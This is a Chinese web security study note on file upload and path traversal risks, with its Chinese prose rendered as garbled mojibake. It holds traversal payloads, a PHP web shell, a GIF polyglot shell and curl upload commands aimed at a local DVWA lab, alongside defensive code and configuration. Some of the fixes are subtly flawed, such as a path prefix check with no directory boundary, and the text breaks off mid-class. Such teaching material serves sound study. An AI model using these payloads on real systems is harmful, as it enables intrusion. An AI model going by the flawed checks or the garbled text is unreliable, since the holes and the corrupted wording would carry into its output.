---
title: Day039ï¼šWeb å®‰å…¨ - æ–‡ä»¶ä¸Šä¼ ä¸è·¯å¾„é£é™©
tags:
  - ç½‘ç»œ
  - å®‰å…¨
  - å­¦ä¹ è®¡åˆ’
categories:
  - ç½‘ç»œå®‰å…¨
abbrlink: f279f396
date: 2026-02-01 00:00:00
updated: 2026-02-01 00:00:00

---
# Day039ï¼šWeb å®‰å…¨ - æ–‡ä»¶ä¸Šä¼ ä¸è·¯å¾„é£é™©

- æ—¥æœŸï¼š2026-02-01
- å‘¨æ¬¡ï¼šç¬¬6å‘¨

## å­¦ä¹ ç›®æ ‡
- ç†è§£ä¸Šä¼ ä¸è·¯å¾„ç©¿è¶Šçš„é£é™©
- ä¼šè®¾è®¡å®‰å…¨çš„ä¸Šä¼ ç­–ç•¥

<!--more-->

## å­¦ä¹ å†…å®¹

### 1ï¸âƒ£ æ–‡ä»¶ä¸Šä¼ å®‰å…¨åŸºç¡€

#### 1.1 æ–‡ä»¶ä¸Šä¼ é£é™©

| é£é™©ç±»å‹ | è¯´æ˜ | å½±å“ |
|---------|------|------|
| **æ¶æ„æ–‡ä»¶ä¸Šä¼ ** | æ”»å‡»è€…ä¸Šä¼  Web Shell/ç—…æ¯’ | è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ |
| **è·¯å¾„ç©¿è¶Š** | è®¿é—®æ–‡ä»¶ç³»ç»Ÿå…¶ä»–ç›®å½• | æ•æ„Ÿæ•°æ®æ³„éœ² |
| **æ–‡ä»¶è¦†ç›–** | è¦†ç›–ç³»ç»Ÿ/å…¶ä»–ç”¨æˆ·æ–‡ä»¶ | ç³»ç»Ÿç ´å/æƒé™æå‡ |
| **æ‹’ç»æœåŠ¡** | ä¸Šä¼ å¤§æ–‡ä»¶æ¶ˆè€—èµ„æº | ç£ç›˜/å¸¦å®½è€—å°½ |
| **ä¿¡æ¯æ³„éœ²** | æ–‡ä»¶å/è·¯å¾„æ³„éœ²ç³»ç»Ÿä¿¡æ¯ | è¾…åŠ©å…¶ä»–æ”»å‡» |

---

#### 1.2 ä¸å®‰å…¨ä¸Šä¼ ä»£ç ç¤ºä¾‹

```php
// âŒ ä¸å®‰å…¨ï¼šç›´æ¥ä½¿ç”¨ç”¨æˆ·æä¾›çš„æ–‡ä»¶å
$filename = $_FILES["uploaded_file"]["name"];
$filepath = "/var/www/uploads/" . $filename;
move_uploaded_file($_FILES["uploaded_file"]["tmp_name"], $filepath);

// æ”»å‡»ç¤ºä¾‹ï¼š
// ä¸Šä¼ æ–‡ä»¶åï¼ševil.php
// å®é™…å­˜å‚¨ï¼š/var/www/uploads/evil.php
// è®¿é—®ï¼šhttp://site.com/uploads/evil.phpï¼ˆå¯æ‰§è¡Œï¼‰
```

---

#### 1.3 è·¯å¾„ç©¿è¶Šï¼ˆPath Traversalï¼‰æ”»å‡»

**æ”»å‡»åŸç†**ï¼šä½¿ç”¨ `../` éå†æ–‡ä»¶ç³»ç»Ÿã€‚

| æ”»å‡»å­—ç¬¦ä¸² | ç›®çš„ |
|-----------|------|
| `../../etc/passwd` | è¯»å–ç³»ç»Ÿå¯†ç æ–‡ä»¶ |
| `../../../var/www/html/config.php` | è¯»å–æ•°æ®åº“é…ç½® |
| `..\..\..\windows\system32\config` | Windows ç³»ç»Ÿé…ç½® |

**æ”»å‡»ç¤ºä¾‹**ï¼š

```bash
# ä¸å®‰å…¨ PHP ä»£ç 
$filename = $_GET["file"];
$filepath = "/var/www/files/" . $filename;
include($filepath);  // âŒ ç›´æ¥åŒ…å«ç”¨æˆ·è¾“å…¥

# æ”»å‡»è¯·æ±‚
# http://site.com/view.php?file=../../etc/passwd

# ç»“æœï¼šè¯»å–ç³»ç»Ÿå¯†ç æ–‡ä»¶
```

---

### 2ï¸âƒ£ æ–‡ä»¶ä¸Šä¼ é˜²æŠ¤ç­–ç•¥

#### 2.1 ç™½åå•æ‰©å±•å

**åªå…è®¸å®‰å…¨çš„æ–‡ä»¶ç±»å‹**ï¼š

```php
// âœ… å®‰å…¨ï¼šç™½åå•æ‰©å±•å
$allowed_extensions = ["jpg", "jpeg", "png", "gif", "pdf", "doc", "docx"];
$filename = $_FILES["uploaded_file"]["name"];
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if (!in_array($extension, $allowed_extensions)) {
    die("åªå…è®¸ä¸Šä¼ ï¼šjpg, jpeg, png, gif, pdf, doc, docx");
}

// âŒ ä¸å®‰å…¨ï¼šé»‘åå•
// $blocked_extensions = ["php", "exe", "sh"];
// // æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ .php5, .phtml ç­‰ç»•è¿‡
```

---

#### 2.2 MIME ç±»å‹éªŒè¯

**ä½¿ç”¨æ–‡ä»¶å†…å®¹è€Œéæ–‡ä»¶ååˆ¤æ–­ç±»å‹**ï¼š

```php
// âœ… å®‰å…¨ï¼šæ£€æŸ¥æ–‡ä»¶ MIME ç±»å‹
$allowed_mime_types = [
    "image/jpeg",
    "image/png",
    "image/gif",
    "application/pdf",
    "application/msword",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
];

$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime_type = $finfo->file($_FILES["uploaded_file"]["tmp_name"]);

if (!in_array($mime_type, $allowed_mime_types)) {
    die("æ–‡ä»¶ç±»å‹ä¸å…è®¸");
}

// âŒ ä¸å®‰å…¨ï¼šåªæ£€æŸ¥æ–‡ä»¶åæ‰©å±•
// æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ–‡ä»¶å¤´ï¼ˆMagic Bytesï¼‰ä¼ªé€ ç±»å‹
```

**æ–‡ä»¶ç­¾åï¼ˆMagic Bytesï¼‰éªŒè¯**ï¼š

```python
import magic

def validate_file_type(file_path, allowed_mime_types):
    """éªŒè¯æ–‡ä»¶ç±»å‹"""
    mime = magic.Magic(mime=True)
    file_type = mime.from_file(file_path)
    
    if file_type not in allowed_mime_types:
        raise ValueError(f"æ–‡ä»¶ç±»å‹ä¸å…è®¸: {file_type}")
    
    return file_type

# ä½¿ç”¨ç¤ºä¾‹
allowed_mimes = ["image/jpeg", "image/png", "image/gif"]
validate_file_type("upload.jpg", allowed_mimes)
```

---

#### 2.3 æ–‡ä»¶åå®‰å…¨å¤„ç†

**ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶å**ï¼š

```php
// âœ… å®‰å…¨ï¼šç”Ÿæˆå”¯ä¸€æ–‡ä»¶å
$filename = $_FILES["uploaded_file"]["name"];
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

// ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶å
$safe_filename = uniqid() . "_" . bin2hex(random_bytes(8)) . "." . $extension;

// è§„èŒƒåŒ–æ–‡ä»¶åï¼ˆç§»é™¤ç‰¹æ®Šå­—ç¬¦ï¼‰
$safe_filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $safe_filename);

$filepath = "/var/www/uploads/" . $safe_filename;
move_uploaded_file($_FILES["uploaded_file"]["tmp_name"], $filepath);

// ç¤ºä¾‹è¾“å‡ºï¼š
// åŸå§‹æ–‡ä»¶ï¼š../../etc/passwd.php
// å®‰å…¨æ–‡ä»¶åï¼š5e3a1b2c3d4e5f67890abcd_ef123456.jpg
```

**Python å®‰å…¨æ–‡ä»¶åç”Ÿæˆ**ï¼š

```python
import os
import uuid
import secrets
from datetime import datetime

def generate_safe_filename(original_filename):
    """ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶å"""
    # è·å–æ‰©å±•å
    ext = os.path.splitext(original_filename)[1].lower()
    
    # éªŒè¯æ‰©å±•åï¼ˆç™½åå•ï¼‰
    allowed_extensions = [".jpg", ".jpeg", ".png", ".gif", ".pdf", ".doc", ".docx"]
    if ext not in allowed_extensions:
        raise ValueError("æ–‡ä»¶ç±»å‹ä¸å…è®¸")
    
    # ç”Ÿæˆå”¯ä¸€æ–‡ä»¶å
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    random_str = secrets.token_hex(8)
    safe_filename = f"{timestamp}_{random_str}{ext}"
    
    return safe_filename

# ä½¿ç”¨ç¤ºä¾‹
safe_name = generate_safe_filename("test.png")
# è¾“å‡ºï¼š20260201_123456_a1b2c3d4e5f6789.png
```

---

#### 2.4 å­˜å‚¨ä½ç½®éš”ç¦»

**éš”ç¦»ä¸Šä¼ æ–‡ä»¶ï¼Œé¿å…ç›´æ¥æ‰§è¡Œ**ï¼š

```
Web æ ¹ç›®å½•
â”œâ”€â”€ index.php
â”œâ”€â”€ uploads/              # ä¸Šä¼ æ–‡ä»¶ç›®å½•ï¼ˆç¦æ­¢æ‰§è¡Œï¼‰
â”‚   â”œâ”€â”€ .htaccess        # ç¦æ­¢æ‰§è¡Œ PHP/è„šæœ¬
â”‚   â””â”€â”€ 20260201_...jpg
â””â”€â”€ public/               # å…¬å¼€èµ„æº
    â”œâ”€â”€ css/
    â”œâ”€â”€ js/
    â””â”€â”€ images/
```

**é…ç½®ç¤ºä¾‹ï¼ˆApache .htaccessï¼‰**ï¼š

```apache
# uploads ç›®å½•é…ç½®
<Directory "/var/www/uploads">
    # ç¦æ­¢æ‰§è¡Œ PHP è„šæœ¬
    <FilesMatch "\.php$">
        Order Allow,Deny
        Deny from all
    </FilesMatch>
    
    # ç¦æ­¢æ‰§è¡Œæ‰€æœ‰è„šæœ¬
    <FilesMatch "\.(php|phtml|php3|php4|php5|pl|py|jsp|asp|aspx|sh|exe)$">
        Order Allow,Deny
        Deny from all
    </FilesMatch>
    
    # ç¦æ­¢ç›´æ¥è®¿é—®
    Options -Indexes
</Directory>

# æˆ–ä½¿ç”¨ Nginx
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
    location ~* \.(phtml|php3|php4|php5|pl|py|jsp|asp|aspx|sh|exe)$ {
        deny all;
    }
}
```

---

### 3ï¸âƒ£ è·¯å¾„ç©¿è¶Šé˜²æŠ¤

#### 3.1 è·¯å¾„è§„èŒƒåŒ–

**ä½¿ç”¨è§„èŒƒåŒ–çš„ç»å¯¹è·¯å¾„**ï¼š

```python
import os

def get_safe_path(base_dir, user_path):
    """è·å–å®‰å…¨çš„æ–‡ä»¶è·¯å¾„"""
    # è§„èŒƒåŒ–è·¯å¾„ï¼ˆè§£æ ../ã€./ ç­‰ï¼‰
    absolute_path = os.path.abspath(os.path.join(base_dir, user_path))
    
    # ç¡®ä¿åœ¨åŸºç¡€ç›®å½•å†…
    if not absolute_path.startswith(os.path.abspath(base_dir)):
        raise ValueError("éæ³•çš„æ–‡ä»¶è·¯å¾„")
    
    return absolute_path

# ä½¿ç”¨ç¤ºä¾‹
base_dir = "/var/www/uploads"
user_path = "../../etc/passwd"  # æ”»å‡»è€…æä¾›çš„è·¯å¾„

try:
    safe_path = get_safe_path(base_dir, user_path)
    print(f"å®‰å…¨è·¯å¾„: {safe_path}")
except ValueError as e:
    print(f"æ‹’ç»è®¿é—®: {e}")

# è¾“å‡ºï¼šæ‹’ç»è®¿é—®: éæ³•çš„æ–‡ä»¶è·¯å¾„
```

---

#### 3.2 æ–‡ä»¶ç³»ç»Ÿæƒé™æ§åˆ¶

**æœ€å°æƒé™åŸåˆ™**ï¼š

```bash
# åˆ›å»ºä¸Šä¼ ç›®å½•
mkdir -p /var/www/uploads

# è®¾ç½®ç›®å½•æ‰€æœ‰è€…ä¸º Web ç”¨æˆ·
chown www-data:www-data /var/www/uploads

# è®¾ç½®æƒé™ï¼šæ‰€æœ‰è€…å¯è¯»å†™ï¼Œå…¶ä»–åªè¯»
chmod 750 /var/www/uploads

# ç¦æ­¢æ‰§è¡Œæƒé™
chmod -R 644 /var/www/uploads
find /var/www/uploads -type f -exec chmod 644 {} \;
find /var/www/uploads -type d -exec chmod 755 {} \;

# SELinux é…ç½®ï¼ˆå¦‚æœå¯ç”¨ï¼‰
chcon -R -t httpd_sys_rw_content_t /var/www/uploads
```

**æ–‡ä»¶æƒé™çŸ©é˜µ**ï¼š

| èµ„æº | æƒé™ | è¯´æ˜ |
|------|------|------|
| ä¸Šä¼ ç›®å½• | 750 | æ‰€æœ‰è€…å¯è¯»å†™ï¼Œç»„å¯è¯» |
| ä¸Šä¼ æ–‡ä»¶ | 644 | æ‰€æœ‰è€…å¯è¯»å†™ï¼Œå…¶ä»–åªè¯» |
| é…ç½®æ–‡ä»¶ | 600 | æ‰€æœ‰è€…å¯è¯»å†™ |
| æ—¥å¿—ç›®å½• | 750 | æ‰€æœ‰è€…å¯è¯»å†™ |
| Web æ ¹ç›®å½• | 755 | å¯æ‰§è¡Œæƒé™ |

---

### 4ï¸âƒ£ é…ç½®ç±»é£é™©

#### 4.1 ä¸å®‰å…¨çš„é…ç½®

| é…ç½®é¡¹ | ä¸å®‰å…¨å€¼ | å®‰å…¨å€¼ | é£é™© |
|-------|---------|-------|------|
| `display_errors` | On | Off | ä¿¡æ¯æ³„éœ² |
| `error_reporting` | E_ALL | E_ALL & ~E_NOTICE | ä¿¡æ¯æ³„éœ² |
| `allow_url_include` | On | Off | è¿œç¨‹ä»£ç æ‰§è¡Œ |
| `allow_url_fopen` | On | Off | SSRF |
| `expose_php` | On | Off | ç‰ˆæœ¬æ³„éœ² |
| `file_uploads` | On | æŒ‰éœ€ | æ–‡ä»¶ä¸Šä¼ æ”»å‡» |
| `upload_max_filesize` | è¿‡å¤§ | é™åˆ¶å¤§å° | DoS |

---

#### 4.2 å®‰å…¨é…ç½®ç¤ºä¾‹

```ini
; php.ini å®‰å…¨é…ç½®
display_errors = Off
log_errors = On
error_reporting = E_ALL & ~E_NOTICE
error_log = /var/log/php_errors.log

; æ–‡ä»¶ä¸Šä¼ é…ç½®
file_uploads = On
upload_max_filesize = 10M
post_max_size = 11M
max_file_uploads = 20

; ç¦ç”¨å±é™©å‡½æ•°
disable_functions = exec,shell_exec,system,passthru,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

; ç¦ç”¨å±é™©ç±»ï¼ˆå¦‚æœä½¿ç”¨ Composerï¼‰
; disable_classes = (ç•™ç©ºï¼‰

; ä¼šè¯å®‰å…¨
session.cookie_httponly = On
session.cookie_secure = On
session.use_strict_mode = On
session.cookie_samesite = Strict

; å…¶ä»–å®‰å…¨è®¾ç½®
expose_php = Off
allow_url_include = Off
allow_url_fopen = Off
default_charset = "UTF-8"
```

**Nginx å®‰å…¨é…ç½®**ï¼š

```nginx
server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.php index.html;

    # ç¦æ­¢è®¿é—®éšè—æ–‡ä»¶
    location ~ /\. {
        deny all;
    }

    # ç¦æ­¢è®¿é—®æ•æ„Ÿæ–‡ä»¶
    location ~ /\.(git|svn|env|log|sql)$ {
        deny all;
    }

    # ä¸Šä¼ ç›®å½•å®‰å…¨é…ç½®
    location /uploads/ {
        location ~ \.php$ {
            deny all;
        }
        location ~* \.(phtml|php3|php4|php5|pl|py|jsp|asp|aspx|sh|exe)$ {
            deny all;
        }
    }

    # é™åˆ¶è¯·æ±‚å¤§å°
    client_max_body_size 10m;

    # å®‰å…¨å“åº”å¤´
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;

    # ç¦ç”¨ TRACE å’Œ TRACK æ–¹æ³•
    if ($request_method ~ ^(TRACE|TRACK)$) {
        return 405;
    }
}
```

---

### 5ï¸âƒ£ æ–‡ä»¶ä¸Šä¼ å®‰å…¨æ£€æŸ¥æ¸…å•

```markdown
# æ–‡ä»¶ä¸Šä¼ å®‰å…¨æ£€æŸ¥æ¸…å•

## è¾“å…¥éªŒè¯
- [ ] ä½¿ç”¨ç™½åå•æ‰©å±•åï¼ˆè€Œéé»‘åå•ï¼‰
- [ ] éªŒè¯ MIME ç±»å‹ï¼ˆä½¿ç”¨æ–‡ä»¶å†…å®¹åˆ¤æ–­ï¼‰
- [ ] éªŒè¯æ–‡ä»¶å¤§å°ï¼ˆè®¾ç½®æœ€å¤§é™åˆ¶ï¼‰
- [ ] éªŒè¯æ–‡ä»¶å†…å®¹ï¼ˆå¯é€‰ï¼šå›¾ç‰‡å°ºå¯¸ã€æ ¼å¼ï¼‰
- [ ] æ£€æŸ¥æ–‡ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼ˆå¦‚å›¾ç‰‡ä¸­åµŒå…¥ PHPï¼‰

## æ–‡ä»¶åå¤„ç†
- [ ] ç”Ÿæˆå®‰å…¨çš„æ–‡ä»¶åï¼ˆéšæœºã€å”¯ä¸€ï¼‰
- [ ] ç§»é™¤è·¯å¾„å­—ç¬¦ï¼ˆ../, ./ï¼‰
- [ ] ç§»é™¤ç‰¹æ®Šå­—ç¬¦ï¼ˆç©ºæ ¼ã€æ§åˆ¶å­—ç¬¦ï¼‰
- [ ] ä½¿ç”¨è§„èŒƒçš„ç»å¯¹è·¯å¾„

## å­˜å‚¨å®‰å…¨
- [ ] ä¸Šä¼ ç›®å½•ç¦æ­¢æ‰§è¡Œ PHP/è„šæœ¬ï¼ˆ.htaccess æˆ–é…ç½®ï¼‰
- [ ] ä¸Šä¼ ç›®å½•éš”ç¦»ï¼ˆä¸ä¸ Web æ··æ·†ï¼‰
- [ ] æ–‡ä»¶æƒé™æœ€å°åŒ–ï¼ˆ644 æˆ–æ›´ä¸¥æ ¼ï¼‰
- [ ] ç›®å½•æƒé™æœ€å°åŒ–ï¼ˆ755 æˆ–æ›´ä¸¥æ ¼ï¼‰

## è®¿é—®æ§åˆ¶
- [ ] é€šè¿‡ URL é—´æ¥è®¿é—®ï¼ˆä¸ç›´æ¥æš´éœ²æ–‡ä»¶è·¯å¾„ï¼‰
- [ ] å®ç°è®¿é—®æ§åˆ¶ï¼ˆç”¨æˆ·åªèƒ½è®¿é—®è‡ªå·±çš„æ–‡ä»¶ï¼‰
- [ ] è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆå®šæœŸæ¸…ç†æ—§æ–‡ä»¶ï¼‰
- [ ] è®°å½•æ‰€æœ‰ä¸Šä¼ æ“ä½œ

## é…ç½®å®‰å…¨
- [ ] ç¦ç”¨ display_errorsï¼ˆä¿¡æ¯æ³„éœ²ï¼‰
- [ ] é™åˆ¶ upload_max_filesize å’Œ post_max_size
- [ ] ç¦ç”¨å±é™©å‡½æ•°ï¼ˆexec, shell_exec ç­‰ï¼‰
- [ ] é…ç½®ä¼šè¯å®‰å…¨ï¼ˆHttpOnly, Secure, SameSiteï¼‰
- [ ] å¯ç”¨å®‰å…¨å“åº”å¤´ï¼ˆCSP, HSTS, X-Frame-Optionsï¼‰

## ç›‘æ§å’Œå®¡è®¡
- [ ] è®°å½•æ‰€æœ‰ä¸Šä¼ æ“ä½œï¼ˆæ—¶é—´ã€ç”¨æˆ·ã€æ–‡ä»¶ã€IPï¼‰
- [ ] ç›‘æ§ç£ç›˜ä½¿ç”¨æƒ…å†µ
- [ ] å®šæœŸæ‰«æä¸Šä¼ ç›®å½•æŸ¥æ‰¾å¯ç–‘æ–‡ä»¶
- [ ] é…ç½®å‘Šè­¦ï¼ˆå¼‚å¸¸ä¸Šä¼ è¡Œä¸ºï¼‰
```

## å®è·µä»»åŠ¡ï¼ˆåˆæ³•æˆæƒèŒƒå›´å†…ï¼‰

> **é‡è¦æé†’**ï¼šä»¥ä¸‹å®è·µä»…åœ¨æœ¬åœ°è‡ªå»ºé¶åœºæˆ–æˆæƒæµ‹è¯•ç¯å¢ƒä¸­è¿›è¡Œã€‚

---

### ä»»åŠ¡ 1ï¼ˆå¿…åšï¼‰ï¼šæ¼”ç¤ºè·¯å¾„ç©¿è¶Šæ”»å‡»

**ç›®æ ‡**ï¼šåœ¨ DVWA/Pikachu ä¸­æ¼”ç¤ºè·¯å¾„ç©¿è¶Šæ¼æ´ã€‚

**æ­¥éª¤**ï¼š

**1. å¯åŠ¨ DVWA é¶åœº**

```bash
# å¯åŠ¨ DVWAï¼ˆå¦‚æœæœªå¯åŠ¨ï¼‰
docker run -d -p 8080:80 \
  -e DVWA_USERNAME=admin \
  -e DVWA_PASSWORD=password \
  vulnerables/web-dvwa

# è®¿é—® http://localhost:8080
# ç™»å½•ï¼šadmin / password
# è®¾ç½®å®‰å…¨çº§åˆ«ä¸º Low
```

**2. æ¼”ç¤ºè·¯å¾„ç©¿è¶Šï¼ˆDVWA File Inclusionï¼‰**

```bash
# Low çº§åˆ«æ¼æ´ä»£ç ï¼ˆDVWAï¼‰
// ä¸å®‰å…¨ä»£ç ï¼šç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥
$filename = $_GET["filename"];
include($filename);  // âŒ ç›´æ¥åŒ…å«

// æ”»å‡» Payload 1ï¼šè¯»å–ç³»ç»Ÿæ–‡ä»¶
http://localhost:8080/vulnerabilities/fi/?page=../../etc/passwd

// æ”»å‡» Payload 2ï¼šè¯»å– Apache é…ç½®
http://localhost:8080/vulnerabilities/fi/?page=../../etc/apache2/apache2.conf

// æ”»å‡» Payload 3ï¼šè¯»å–åº”ç”¨é…ç½®
http://localhost:8080/vulnerabilities/fi/?page=../../php.ini

// ä½¿ç”¨ curl æµ‹è¯•
curl "http://localhost:8080/vulnerabilities/fi/?page=../../etc/passwd"
```

**3. åˆ†ææ”»å‡»ç»“æœ**

| æ”»å‡»ç›®æ ‡ | ç»“æœ | é£é™©ç­‰çº§ |
|---------|------|---------|
| `/etc/passwd` | âœ… æˆåŠŸè¯»å–ç³»ç»Ÿå¯†ç æ–‡ä»¶ | ğŸ”´ ä¸¥é‡ |
| `/etc/apache2/apache2.conf` | âœ… æˆåŠŸè¯»å– Apache é…ç½® | ğŸ”´ ä¸¥é‡ |
| `/var/www/html/config.php` | âœ… å¯èƒ½è¯»å–åº”ç”¨é…ç½®ï¼ˆæ•°æ®åº“å¯†ç ï¼‰ | ğŸ”´ ä¸¥é‡ |

---

### ä»»åŠ¡ 2ï¼ˆå¿…åšï¼‰ï¼šæ¼”ç¤ºæ–‡ä»¶ä¸Šä¼ æ”»å‡»

**ç›®æ ‡**ï¼šåœ¨ DVWA ä¸­æ¼”ç¤ºä¸å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ ã€‚

**æ­¥éª¤**ï¼š

**1. è®¿é—® DVWA ä¸Šä¼ æ¨¡å—**

```bash
# è®¿é—®ä¸Šä¼ æ¨¡å—
http://localhost:8080/vulnerabilities/upload/

# Low çº§åˆ«ï¼šä¸æ£€æŸ¥æ–‡ä»¶ç±»å‹
// ç›´æ¥ä½¿ç”¨ç”¨æˆ·æä¾›çš„æ–‡ä»¶å
$uploaded_path = $_FILES["uploaded"]["name"];
move_uploaded_file($_FILES["uploaded"]["tmp_name"], $uploaded_path);
```

**2. ä¸Šä¼  Web Shell**

```php
// åˆ›å»ºæ¶æ„ PHP æ–‡ä»¶ï¼ˆshell.phpï¼‰
<?php
    system($_GET["cmd"]);
?>

// ä½¿ç”¨ curl ä¸Šä¼ 
curl -X POST "http://localhost:8080/vulnerabilities/upload/" \
  -F "uploaded=@shell.php" \
  -v

# ä¸Šä¼ æˆåŠŸåï¼Œè®¿é—® Web Shell
http://localhost:8080/hackable/uploads/shell.php?cmd=ls -la

# æ‰§è¡Œå‘½ä»¤
# é¢„æœŸï¼šåˆ—å‡º uploads ç›®å½•æ–‡ä»¶
```

**3. ä¸Šä¼ å›¾ç‰‡é©¬ï¼ˆImage Polyglotï¼‰**

```bash
# åˆ›å»ºåŒ…å« PHP ä»£ç çš„å›¾ç‰‡ï¼ˆæŠ€æœ¯ï¼šåˆ©ç”¨ GIF æ–‡ä»¶ç»“æ„ï¼‰
# æ–¹æ³• 1ï¼šGIF89a + PHP ä»£ç 
echo "GIF89a<?php system($_GET['cmd']); ?>" > webshell.gif

# æ–¹æ³• 2ï¼šåŒåç¼€ç»•è¿‡
mv shell.php "shell.php.jpg"

# ä¸Šä¼ åå°è¯•è®¿é—®
http://localhost:8080/hackable/uploads/webshell.gif?cmd=whoami
```

**4. æ¼”ç¤ºæ–‡ä»¶è¦†ç›–æ”»å‡»**

```bash
# ä¸Šä¼ åŒåæ–‡ä»¶è¦†ç›–ç³»ç»Ÿæ–‡ä»¶
# ä¸Šä¼  index.phpï¼Œè¦†ç›–åº”ç”¨å…¥å£
curl -X POST "http://localhost:8080/vulnerabilities/upload/" \
  -F "uploaded=@malicious_index.php"

# è®¿é—®åº”ç”¨å…¥å£
http://localhost:8080/index.php
# é¢„æœŸï¼šæ‰§è¡Œæ¶æ„ä»£ç 
```

---

### ä»»åŠ¡ 3ï¼ˆå¿…åšï¼‰ï¼šä¿®å¤è·¯å¾„ç©¿è¶Šæ¼æ´

**ç›®æ ‡**ï¼šä½¿ç”¨è·¯å¾„è§„èŒƒåŒ–ä¿®å¤è·¯å¾„ç©¿è¶Šã€‚

**æ­¥éª¤**ï¼š

**1. PHP ä¿®å¤ç¤ºä¾‹ï¼ˆbasename + realpathï¼‰**

```php
// âœ… å®‰å…¨ä»£ç ï¼šè·¯å¾„è§„èŒƒåŒ–
$base_dir = "/var/www/vulnerable/files/";
$filename = $_GET["page"];

// è·å–æ–‡ä»¶åï¼ˆç§»é™¤è·¯å¾„éƒ¨åˆ†ï¼‰
$filename = basename($filename);

// æ„å»ºç»å¯¹è·¯å¾„
$filepath = realpath($base_dir . $filename);

// éªŒè¯è·¯å¾„åœ¨åŸºç¡€ç›®å½•å†…
if (strpos($filepath, $base_dir) !== 0) {
    die("éæ³•çš„æ–‡ä»¶è·¯å¾„");
}

// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ä¸”å¯è¯»
if (!file_exists($filepath) || !is_readable($filepath)) {
    die("æ–‡ä»¶ä¸å­˜åœ¨æˆ–ä¸å¯è¯»");
}

// å®‰å…¨åŒ…å«
include($filepath);
```

**2. Python ä¿®å¤ç¤ºä¾‹ï¼ˆos.path.abspathï¼‰**

```python
import os

BASE_DIR = "/var/www/uploads/"

def safe_include(filename):
    """å®‰å…¨çš„æ–‡ä»¶åŒ…å«"""
    # è§„èŒƒåŒ–è·¯å¾„
    filepath = os.path.abspath(os.path.join(BASE_DIR, filename))
    
    # éªŒè¯è·¯å¾„åœ¨åŸºç¡€ç›®å½•å†…
    if not filepath.startswith(os.path.abspath(BASE_DIR)):
        raise ValueError("éæ³•çš„æ–‡ä»¶è·¯å¾„")
    
    # æ£€æŸ¥æ–‡ä»¶å­˜åœ¨æ€§
    if not os.path.exists(filepath):
        raise ValueError("æ–‡ä»¶ä¸å­˜åœ¨")
    
    return filepath

# ä½¿ç”¨ç¤ºä¾‹
try:
    safe_path = safe_include("../../etc/passwd")
    print(f"å®‰å…¨è·¯å¾„: {safe_path}")  # é¢„æœŸï¼šæŠ›å‡ºå¼‚å¸¸
except ValueError as e:
    print(f"æ‹’ç»è®¿é—®: {e}")

# æ­£å¸¸ä½¿ç”¨
safe_path = safe_include("image.jpg")
print(f"å®‰å…¨è·¯å¾„: {safe_path}")  # /var/www/uploads/image.jpg
```

**3. æµ‹è¯•ä¿®å¤**

```bash
# æµ‹è¯•æ”»å‡» Payload
curl "http://localhost:8080/vulnerabilities/fi/?page=../../etc/passwd"
# é¢„æœŸï¼šéæ³•çš„æ–‡ä»¶è·¯å¾„

# æµ‹è¯•æ­£å¸¸æ–‡ä»¶
curl "http://localhost:8080/vulnerabilities/fi/?page=file1.php"
# é¢„æœŸï¼šæ­£å¸¸æ˜¾ç¤º
```

---

### ä»»åŠ¡ 4ï¼ˆå¿…åšï¼‰ï¼šä¿®å¤æ–‡ä»¶ä¸Šä¼ æ¼æ´

**ç›®æ ‡**ï¼šå®ç°å®‰å…¨çš„æ–‡ä»¶ä¸Šä¼ ç­–ç•¥ã€‚

**æ­¥éª¤**ï¼š

**1. å®Œæ•´çš„ PHP å®‰å…¨ä¸Šä¼ ç±»**

```php
<?php
class SecureFileUploader {
    private $upload_dir;
    private $allowed_extensions;
    private $allowed_mime_types;
    private $max_file_size;

    public function __construct($upload_dir) {
        $this->upload_dir = $upload_dir;
        $this->allowed_extensions = ["jpg", "jpeg", "png", "gif", "pdf"];
        $this->allowed_mime_types = [
            "image/jpeg",
            "image/png",
            "image/gif",
            "application/pdf"
        ];
        $this->max_file_size = 10 * 1024 * 1024; // 10MB
    }

    public function upload($file_field) {
        if (!isset($_FILES[$file_field])) {
            throw new Exception("æ²¡æœ‰ä¸Šä¼ æ–‡ä»¶");
        }

        $file = $_FILES[$file_field];

        // éªŒè¯ 1ï¼šæ£€æŸ¥ä¸Šä¼ é”™è¯¯
        if ($file["error"] !== UPLOAD_ERR_OK) {
            throw new Exception("ä¸Šä¼ é”™è¯¯: " . $file["error"]);
        }

        // éªŒè¯ 2ï¼šæ£€æŸ¥æ–‡ä»¶å¤§å°
        if ($file["size"] > $this->max_file_size) {
            throw new Exception("æ–‡ä»¶è¿‡å¤§ï¼ˆæœ€å¤§ " . ($this->max_file_size / 1024 / 1024) . "MBï¼‰");
        }

        // éªŒè¯ 3ï¼šè·å–æ–‡ä»¶æ‰©å±•å
        $filename = $file["name"];
        $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

        // éªŒè¯ 4ï¼šç™½åå•æ‰©å±•å
        if (!in_array($extension, $this->allowed_extensions)) {
            throw new Exception("ä¸å…è®¸çš„æ–‡ä»¶ç±»å‹");
        }

        // éªŒè¯ 5ï¼šæ£€æŸ¥ MIME ç±»å‹ï¼ˆä½¿ç”¨æ–‡ä»¶å†…å®¹ï¼‰
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $mime_type = $finfo->file($file["tmp_name"]);

        if (!in_array($mime_type, $this->allowed_mime_types)) {
